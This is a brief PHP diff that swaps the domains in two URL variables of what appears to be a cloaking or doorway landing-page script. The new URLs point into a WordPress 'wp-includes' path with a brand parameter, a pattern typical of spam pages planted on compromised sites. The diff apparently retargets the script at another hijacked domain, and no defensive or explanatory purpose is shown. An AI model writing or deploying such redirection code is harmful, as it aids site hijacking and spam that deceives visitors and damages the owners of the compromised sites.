@@ -41,8 +41,8 @@ if (isset($_GET['www'])) {
     denied();
     exit();
 }
-$ampnya = "https://seputarjabar.pages.dev/?www=$BRANDS.html";
-$urlpath = "https://seputarjabar.co.id/wp-includes/?www=$BRANDS";
+$ampnya = "https://balapropertijogja.pages.dev/?www=$BRANDS.html";
+$urlpath = "https://balapropertijogja.co.id/wp-includes/?www=$BRANDS";
 ?>
 
 <!-- Script Landing Page -->
